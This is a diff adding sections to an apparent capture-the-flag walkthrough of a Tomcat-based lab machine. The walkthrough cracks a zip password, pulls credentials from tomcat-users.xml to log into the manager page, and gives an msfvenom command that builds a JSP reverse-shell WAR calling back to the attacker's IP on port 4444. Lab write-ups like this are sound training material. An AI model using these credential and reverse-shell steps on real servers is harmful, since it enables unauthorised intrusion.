@@ -30,12 +30,19 @@ When you try to unzip this file it will show to be password protected. i would r
 A great example as to why a password needs more entropy than just meeting password guidelines. now that we can log in to our zip file. use 7zip or similar to extract the backup file using the password @administrator_hi5 when prompted. You will get an output similar to</br> 
 Enter password (will not be echoed):</br>
 Everything is Ok</br>
+
+## Exploiting Stolen Credentials
 Looking at the extracted files we can see there is a file called tomcat-users in a human readable format (xml).
 we cat tomcat-users.xml and find something very interesting!
 ![Alt text](/Images/TomcatUserXml.png?raw=true "Readme.txt")
 
 here i can see a list of usernames we can add to the list, some of which come with passwords.I would keep these usernames somewhere for potential future brute force efforts. Now lets try to log in as admin or manager to the tomcat server using 'melehifokivai' as the password.
 ![Alt text](/Images/ManagerLogInSuccess.png?raw=true "Readme.txt")
+It Worked!</br>
+## Reverse Shell Via .WAR
+The clearest escalation into the system rather than the web facing manager application is through the 'WAR file to deploy' section on the manager page. There are a couple ways we can spawn a reverse shell using a .WAR file however the most convenient method was to use msfvenom.I used the command msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f war -o shell.war creating our .WAR file in the directory of the terminal.</br>
+Since this machine is an easy-medium rating i think a reverse shell explanation may be handy. The idea of many reverse shell methods including this one is to upload a file to a server or target machine with the elevated privileges. In this case we upload a .WAR file with the privileged of the admin tomcat user. .WAR files have an executable component which means we can request a bash shell to be sent to our IP on a specific port (in my case, port 4444). 
+
 
 
 
